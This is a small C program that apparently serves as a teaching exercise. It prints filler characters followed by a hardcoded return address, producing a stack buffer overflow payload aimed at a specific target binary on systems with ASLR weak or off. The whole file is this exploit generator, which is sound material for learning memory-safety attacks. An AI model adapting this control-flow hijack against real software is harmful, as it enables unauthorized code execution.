#include <stdio.h>
#include <stdlib.h>

#define x86_64 (sizeof(void*)==8)


int main(int arc, char** argv){
 int i;	
 int magic_number;// depending on the underlying machine (32 vs 64 bit) it should be 64 or 72 
		  // in this specific example and compilation setup
		  // but you can make diffrent tries
		  // the magic number works with limited to no ASLR!!
 char* target_pc;

 if (x86_64)
	target_pc = "\x56\x12\x40\x00\x00\x00\x00\x00"; //please keep this from the disassembly of the target program
 else
	target_pc = "\x24\x85\x04\x08"; //please keep this from the disassembly of the target program

 if (argv[1]){
	 magic_number = strtol(argv[1],NULL,10);
 }
 else{
	printf("you should give me the magic number \n");
	return -1;
 }

 for (i=0;i<magic_number;i++){
	printf("%c",'a');  //all dummy chars, just to fill the buffer of the target function
 }
      printf("%s",target_pc);

return 0 ;

}
